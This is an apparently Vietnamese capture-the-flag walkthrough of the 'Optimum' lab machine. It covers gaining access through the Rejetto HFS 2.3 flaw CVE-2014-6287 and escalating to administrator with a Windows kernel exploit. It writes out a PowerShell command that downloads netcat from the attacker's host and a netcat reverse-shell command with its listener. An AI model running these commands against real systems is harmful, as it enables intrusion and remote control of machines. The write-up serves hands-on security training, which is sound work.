# optimum

- enumeration

scan nmap: phát hiện port 80, sử dụng hfs 2.3

![https://lh7-us.googleusercontent.com/1fvTZpZw0O4rPCELrgS_u2_LTqerhI2JRwX4Tx7U0xhp55VgFbRfjfkivTEiaB00aYDGavk0xTKn2Y9YCxMBe8J3s1yXG0VclQDXqSnIldmLYfV9XJjHryAUj90M7ri9WSann1eRFdDH](https://lh7-us.googleusercontent.com/1fvTZpZw0O4rPCELrgS_u2_LTqerhI2JRwX4Tx7U0xhp55VgFbRfjfkivTEiaB00aYDGavk0xTKn2Y9YCxMBe8J3s1yXG0VclQDXqSnIldmLYfV9XJjHryAUj90M7ri9WSann1eRFdDH)

truy cập port 80 thấy có phần đăng nhập, search

![https://lh7-us.googleusercontent.com/L9PsmvczaTKMgRhkAn54sMRUj3bwFtc6bVIbohBWhGQzcOAYIjZ9TGaLPVXXoMgYu20QMiq8daAtstzPlublwIbtX1tAa3ZGD1P87qW3Tc7omi85GsK6DAG4c4Bjo6XO6zdQkcQ5uUsX](https://lh7-us.googleusercontent.com/L9PsmvczaTKMgRhkAn54sMRUj3bwFtc6bVIbohBWhGQzcOAYIjZ9TGaLPVXXoMgYu20QMiq8daAtstzPlublwIbtX1tAa3ZGD1P87qW3Tc7omi85GsK6DAG4c4Bjo6XO6zdQkcQ5uUsX)

- exploit

tìm kiếm poc

![https://lh7-us.googleusercontent.com/K8gmOLQOGomsqxN-59rDlQu-Eh0gJPwiX-w2CAbPBzVNQOmvKo5agie12uTucpIPSfXjSqVPjjo_GkYCDEzuRRpkxQKVGiEtdjuSA5gCnoEMRaCxysCKuiVEQkPsVq2U2pATas3lNK0N](https://lh7-us.googleusercontent.com/K8gmOLQOGomsqxN-59rDlQu-Eh0gJPwiX-w2CAbPBzVNQOmvKo5agie12uTucpIPSfXjSqVPjjo_GkYCDEzuRRpkxQKVGiEtdjuSA5gCnoEMRaCxysCKuiVEQkPsVq2U2pATas3lNK0N)

[randallbanner/Rejetto-HTTP-File-Server-HFS-2.3.x---Remote-Command-Execution: CVE-2014-6287 (github.com)](https://github.com/randallbanner/Rejetto-HTTP-File-Server-HFS-2.3.x---Remote-Command-Execution/tree/main)

CVE-2014-6287: The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aka HFS or HTTP Fileserver) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action, due to a poor regex. It won't handle a null byte, allowing an attacker to inject code

![https://lh7-us.googleusercontent.com/2Qn3V_si7xvkpaZS313uPKkd94iDywGWrnggjceK7ZBwzSl204-rStYX51NMFaI2hY_LxpWNXeFKtgDOYUDTtr9vVO6pcruUiXjomq78mgcej_M_KD62IC_HsLD_9IZxDvMrk4lqnn6W](https://lh7-us.googleusercontent.com/2Qn3V_si7xvkpaZS313uPKkd94iDywGWrnggjceK7ZBwzSl204-rStYX51NMFaI2hY_LxpWNXeFKtgDOYUDTtr9vVO6pcruUiXjomq78mgcej_M_KD62IC_HsLD_9IZxDvMrk4lqnn6W)

có được quyền truy cập của user kostas và flag user

![https://lh7-us.googleusercontent.com/IZxj4cdCnpPgxaLXSu0EGgkTqTG_z6hSl0jtJT3w6eTdcm7Fh2rQjKHqwCaNIJaYhMEv7OV3lgKGBgSPLMaxJW6rdaHp0DKl9_wvOGJUHhxyxhRVma6b8c0cIh7RQ-RYCd2_dqjgBnD0](https://lh7-us.googleusercontent.com/IZxj4cdCnpPgxaLXSu0EGgkTqTG_z6hSl0jtJT3w6eTdcm7Fh2rQjKHqwCaNIJaYhMEv7OV3lgKGBgSPLMaxJW6rdaHp0DKl9_wvOGJUHhxyxhRVma6b8c0cIh7RQ-RYCd2_dqjgBnD0)

kiểm tra thông tin hệ thống: windows server r2, 64 bit

![https://lh7-us.googleusercontent.com/wvJf5Y4zlrAwJZ9nG-RkeKBZ6muz9etU56DRlxiunDtr19wkIhaTsKR4nP_ilbesnO3ilsbc0KfSkDgCxcnv1m9F6cFSaK9-PgBSqs8QHHqwfjPFVRVAUwDt-C_gQ4cslX2jK1OmZ9In](https://lh7-us.googleusercontent.com/wvJf5Y4zlrAwJZ9nG-RkeKBZ6muz9etU56DRlxiunDtr19wkIhaTsKR4nP_ilbesnO3ilsbc0KfSkDgCxcnv1m9F6cFSaK9-PgBSqs8QHHqwfjPFVRVAUwDt-C_gQ4cslX2jK1OmZ9In)

- privilege escalation

sử dụng windows-exploit-suggester.py để  tìm các lỗ hổng đã được biết đến trên các hệ thống Windows dựa trên bản cập nhật hiện tại của hệ thống và phiên bản Windows đang chạy.

Công cụ này so sánh mức độ bản vá của mục tiêu với cơ sở dữ liệu về lỗ hổng của Microsoft để phát hiện các bản vá bị thiếu tiềm ẩn trên mục tiêu. Nó cũng thông báo cho người dùng nếu có các khai thác công khai và mô-đun Metasploit có sẵn cho các bản tin bị thiếu.

Nó yêu cầu đầu ra lệnh 'systeminfo' từ máy chủ Windows để so sánh cơ sở dữ liệu bản tin bảo mật của Microsoft và xác định mức độ vá lỗi của máy chủ.

Nó có khả năng tự động tải xuống cơ sở dữ liệu bản tin bảo mật từ Microsoft với cờ --update và lưu nó dưới dạng Excel.

cần đưa netcat sang máy target:

sử dụng smbserver để share file:

![https://lh7-us.googleusercontent.com/A3Wm-Nc8koMLdzpSfBqCywUx5u7-cOjOpFyGhqqPB2BHd6CZWbdOFp9XLcEfohlhS-bZx1Ls8pfGE938Esb14d1cps7ionbZHGfxwBCiOwVt4QiaB1AjXUP4yYfKABRTIeY0m-SDktuI](https://lh7-us.googleusercontent.com/A3Wm-Nc8koMLdzpSfBqCywUx5u7-cOjOpFyGhqqPB2BHd6CZWbdOFp9XLcEfohlhS-bZx1Ls8pfGE938Esb14d1cps7ionbZHGfxwBCiOwVt4QiaB1AjXUP4yYfKABRTIeY0m-SDktuI)

![https://lh7-us.googleusercontent.com/L-UvBuWXIMELfIHHBPjTiAUHhgK2kzukjnIDZ8zmmjL56GD50EKbi85mVcxLlY1dW76EJteFJZoeGKTDsigBQHNAx_UpwNUQuUIHFXKF7VB46diO28TFowJ3Jn6qdWCcyMw0DIRv8ez_](https://lh7-us.googleusercontent.com/L-UvBuWXIMELfIHHBPjTiAUHhgK2kzukjnIDZ8zmmjL56GD50EKbi85mVcxLlY1dW76EJteFJZoeGKTDsigBQHNAx_UpwNUQuUIHFXKF7VB46diO28TFowJ3Jn6qdWCcyMw0DIRv8ez_)

(New-Object Net.WebClient).DownloadFile('http://10.10.14.21:1236/nc64.exe', 'C:\Users\kostas\Desktop\nc64.exe')

copy \\10.10.14.21\share\nc64.exe

cần đưa thông tin máy target sang máy attacker:

từ windows tạo file systeminfo.txt

![https://lh7-us.googleusercontent.com/RwotCp238ZiAdqL46MIwg1QQfLfQBN4f1OFh2Yd-kFSzXvMzah5C2bNVXSrVWAqHHVF50Ua-75S058G3rBj4-pv1UDW8S52CU9ua6WpNsWNCbnsae_cSoeiPGYykp882bcD8FOMKuty6](https://lh7-us.googleusercontent.com/RwotCp238ZiAdqL46MIwg1QQfLfQBN4f1OFh2Yd-kFSzXvMzah5C2bNVXSrVWAqHHVF50Ua-75S058G3rBj4-pv1UDW8S52CU9ua6WpNsWNCbnsae_cSoeiPGYykp882bcD8FOMKuty6)

đưa sang kali

![https://lh7-us.googleusercontent.com/zNel4YCdAFX2_GIosKzBBIIwib7ZuzJEUtVQoFGdWRgo9ucLm5doDmXl8SiafiGq6DQL5IaZODPnSaOfu8BJtidV9KgRpJX0ck5jB0kxwG_6k-CibrAA4FipbCq4s66pBS3eb8489Dxf](https://lh7-us.googleusercontent.com/zNel4YCdAFX2_GIosKzBBIIwib7ZuzJEUtVQoFGdWRgo9ucLm5doDmXl8SiafiGq6DQL5IaZODPnSaOfu8BJtidV9KgRpJX0ck5jB0kxwG_6k-CibrAA4FipbCq4s66pBS3eb8489Dxf)

Download here [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

tạo file xls:

python2 windows-exploit-suggester.py --update

cung cấp dữ liệu đầu vào "systeminfo" và trỏ nó vào cơ sở dữ liệu Microsoft:

python2 windows-exploit-suggester.py --database 2024-04-05-mssb.xls --systeminfo /home/kali/Desktop/easy/optimum/sysinfo.txt

![https://lh7-us.googleusercontent.com/t7RRfpwMQs9zTUTtNh2NrUwC-URXrDVQt-4UY8tAaEQhc6-cGldJ04R1AlZPojZjih6WvhuJPkmeGlLkpTDasUiELUhAOF9Q88yY_CuVEac_jkgEAMxVODEZouKdnOFvAz9hGMeHrMod](https://lh7-us.googleusercontent.com/t7RRfpwMQs9zTUTtNh2NrUwC-URXrDVQt-4UY8tAaEQhc6-cGldJ04R1AlZPojZjih6WvhuJPkmeGlLkpTDasUiELUhAOF9Q88yY_CuVEac_jkgEAMxVODEZouKdnOFvAz9hGMeHrMod)

![https://lh7-us.googleusercontent.com/NAg0ibAPhPVWWFK63YOuBjM9jcZk2fe7qKkcZ8r0mClKBfUJvA8cYFt0x36AMYLJ_vsY-Hp2Gw-biamNV5ruO9Zgzs5KQx9ipcEwc-BwxVqM4TyaDytkcEOiPUk3VLlappdUsYRa86XE](https://lh7-us.googleusercontent.com/NAg0ibAPhPVWWFK63YOuBjM9jcZk2fe7qKkcZ8r0mClKBfUJvA8cYFt0x36AMYLJ_vsY-Hp2Gw-biamNV5ruO9Zgzs5KQx9ipcEwc-BwxVqM4TyaDytkcEOiPUk3VLlappdUsYRa86XE)

![https://lh7-us.googleusercontent.com/U5uM3NWlbUC6t5ipGIOcz9_6QtzbslMU5V-q29SDieUQo0EHzxVh8KRQPmfPW10mjMOJa_j5n44mspJaGD2z2AsM75tMMU_KfIt3hiosZdJzfZJkIHO7RK6-CMWXwl5mScBGOWQkFGRt](https://lh7-us.googleusercontent.com/U5uM3NWlbUC6t5ipGIOcz9_6QtzbslMU5V-q29SDieUQo0EHzxVh8KRQPmfPW10mjMOJa_j5n44mspJaGD2z2AsM75tMMU_KfIt3hiosZdJzfZJkIHO7RK6-CMWXwl5mScBGOWQkFGRt)

![https://lh7-us.googleusercontent.com/dFqFNf3s7KNlrIpLf2Ft8AR6JGRaziZWmrKgaWuKD_FuPYUclv1kx8SVkx3YDaSdnHEnF8SR3XHvypWpBQ0kRX4ILjQTdSDaF_dkFLbXjCwxbrVxq27_cTtCudds_B3-vbrQ99cOVmSV](https://lh7-us.googleusercontent.com/dFqFNf3s7KNlrIpLf2Ft8AR6JGRaziZWmrKgaWuKD_FuPYUclv1kx8SVkx3YDaSdnHEnF8SR3XHvypWpBQ0kRX4ILjQTdSDaF_dkFLbXjCwxbrVxq27_cTtCudds_B3-vbrQ99cOVmSV)

![https://lh7-us.googleusercontent.com/aWX6ytpQydjLDz5oyG4aYGpAplRiuRmvimX5RV6I4BbFDKDs7B4V9bmx5EJbNCsp-JtrowuumIgTqbbEa-Qu-MumB8NWShZe9W9wrrrwadbENhQE_ai3YB6akb6lXzd1bgLEMt8Mjnx7](https://lh7-us.googleusercontent.com/aWX6ytpQydjLDz5oyG4aYGpAplRiuRmvimX5RV6I4BbFDKDs7B4V9bmx5EJbNCsp-JtrowuumIgTqbbEa-Qu-MumB8NWShZe9W9wrrrwadbENhQE_ai3YB6akb6lXzd1bgLEMt8Mjnx7)

từ danh sách sử dụng edb 41020 để exploit (phải tìm kiếm thông tin phù hợp với vul, nếu ko tìm đc phải thử hết all exploit đc gợi ý cho đến khi khai thác được)

từ url truy cập có được file exploit 41020.c -> chuyển thành file .exe

![https://lh7-us.googleusercontent.com/RTfKgl7l3QA7UjIjIHy5-hQJU8rFfC7BO3c-pQxY4wo7Iu_3pklzxeXk6rlzq8gsrw4i_SIlxBw7Tn5P3_kg7dn_RTsCvW7K9zoQdm8cgqzfyHz9ISlXR_sXy7bx5uSoutbXA2B2Poi0](https://lh7-us.googleusercontent.com/RTfKgl7l3QA7UjIjIHy5-hQJU8rFfC7BO3c-pQxY4wo7Iu_3pklzxeXk6rlzq8gsrw4i_SIlxBw7Tn5P3_kg7dn_RTsCvW7K9zoQdm8cgqzfyHz9ISlXR_sXy7bx5uSoutbXA2B2Poi0)

đưa file exploit sang máy target

sử dụng nc để có được shell cmd:

\\10.10.14.21\share\nc64.exe 10.10.14.21 3333 -e cmd

![https://lh7-us.googleusercontent.com/L-UvBuWXIMELfIHHBPjTiAUHhgK2kzukjnIDZ8zmmjL56GD50EKbi85mVcxLlY1dW76EJteFJZoeGKTDsigBQHNAx_UpwNUQuUIHFXKF7VB46diO28TFowJ3Jn6qdWCcyMw0DIRv8ez_](https://lh7-us.googleusercontent.com/L-UvBuWXIMELfIHHBPjTiAUHhgK2kzukjnIDZ8zmmjL56GD50EKbi85mVcxLlY1dW76EJteFJZoeGKTDsigBQHNAx_UpwNUQuUIHFXKF7VB46diO28TFowJ3Jn6qdWCcyMw0DIRv8ez_)

nc -lnvp 3333

![https://lh7-us.googleusercontent.com/zwj-qDfbwMXHU4cci3a_1IROfxmMaTqpNtDE0a5Tp9RCOQTysVl_HPEq5jE3HAP7iWv2dWa3WNXlaTrSMdZYQKmP4HTqm2ZawNmqtR06bW1RaYkg2oB1-YyOAo1aSGJfOmBxivOW_tsK](https://lh7-us.googleusercontent.com/zwj-qDfbwMXHU4cci3a_1IROfxmMaTqpNtDE0a5Tp9RCOQTysVl_HPEq5jE3HAP7iWv2dWa3WNXlaTrSMdZYQKmP4HTqm2ZawNmqtR06bW1RaYkg2oB1-YyOAo1aSGJfOmBxivOW_tsK)

có được shell với quyền admin

![https://lh7-us.googleusercontent.com/nghKEeHWUdy8EP8ou7-tAQZX5kRc8qPOV__6ByIt1u85KMWCstCV75A5cp1L99Ft2LSTZO82AbngTHxwxQMwSqKoKtT5OcHlpoWGcEzdi4J-FgUUkfsvPz7MoqQDhXbMTqTZXATlQL5p](https://lh7-us.googleusercontent.com/nghKEeHWUdy8EP8ou7-tAQZX5kRc8qPOV__6ByIt1u85KMWCstCV75A5cp1L99Ft2LSTZO82AbngTHxwxQMwSqKoKtT5OcHlpoWGcEzdi4J-FgUUkfsvPz7MoqQDhXbMTqTZXATlQL5p)

![https://lh7-us.googleusercontent.com/M1mXUI_HFiPGpY5R86ugiJNORguk9FugfNrs67f1I8thp7fUfLCSJ9Ff5dHoo3X554buK1V1He3uuGSt_TUedyD3GQVX9ylMWVQ5YLINcKxzE0B6jbHNJ5Z0cybCTJJqHg7v-ksqMCmF](https://lh7-us.googleusercontent.com/M1mXUI_HFiPGpY5R86ugiJNORguk9FugfNrs67f1I8thp7fUfLCSJ9Ff5dHoo3X554buK1V1He3uuGSt_TUedyD3GQVX9ylMWVQ5YLINcKxzE0B6jbHNJ5Z0cybCTJJqHg7v-ksqMCmF)